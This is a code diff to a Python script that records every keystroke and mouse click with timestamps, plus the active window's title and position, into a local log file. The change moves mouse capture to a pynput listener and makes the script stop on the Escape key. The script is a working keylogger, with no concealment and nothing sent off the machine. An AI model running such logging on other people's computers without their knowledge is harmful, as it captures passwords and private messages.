@@ -1,6 +1,7 @@
 import pyautogui
 import keyboard
 import time
+from pynput import mouse
 
 current_window = None
 
@@ -42,30 +43,33 @@ def log_keystrokes(event):
                 f.write(f"[{key_time:.3f}]{event.name}\n")
             f.flush()
 
-def log_mouse_click(event):
+def log_mouse_click(x, y, button, pressed):
     global current_window
 
-    click_time = time.time()
-    click_position = pyautogui.position()
-    active_window = pyautogui.getActiveWindow()
+    if pressed:  # Log only on mouse click press events
+        click_time = time.time()
+        active_window = pyautogui.getActiveWindow()
 
-    with open('logfile.txt', 'a') as f:
-        if current_window != active_window:
-            # If the active window has changed, update window information
-            current_window = active_window
-            f.write(f"\nWindow Title: {current_window.title}\n")
-            
-            if current_window.left == 0 and current_window.top == 0:
-                f.write("Window Position: No-Window Selected\n")
-            else:
-                f.write(f"Window Position: ({current_window.left}, {current_window.top})\n")
+        with open('logfile.txt', 'a') as f:
+            if current_window != active_window:
+                # If the active window has changed, update window information
+                current_window = active_window
+                f.write(f"\nWindow Title: {current_window.title}\n")
+                
+                if current_window.left == 0 and current_window.top == 0:
+                    f.write("Window Position: No-Window Selected\n")
+                else:
+                    f.write(f"Window Position: ({current_window.left}, {current_window.top})\n")
 
-        f.write(f"[{click_time:.3f}]Mouse Click at ({click_position[0]}, {click_position[1]})\n")
-        f.flush()
+            f.write(f"[{click_time:.3f}]Mouse Click at ({x}, {y})\n")
+            f.flush()
 
+# Hook for keystrokes
 keyboard.hook(log_keystrokes)
-keyboard.hook_key('esc', lambda e: keyboard.unhook_all())  # Unhook all when the 'esc' key is pressed
-keyboard.hook_key('esc', lambda e: keyboard.unhook_all())  # Unhook all when the 'esc' key is pressed
-keyboard.hook(log_mouse_click)
 
-keyboard.wait()  # Wait indefinitely for any key to be pressed
+# Hook for mouse clicks using pynput
+mouse_listener = mouse.Listener(on_click=log_mouse_click)
+mouse_listener.start()
+
+keyboard.wait('esc')  # Wait for the 'esc' key to be pressed and exit the script
+mouse_listener.stop()
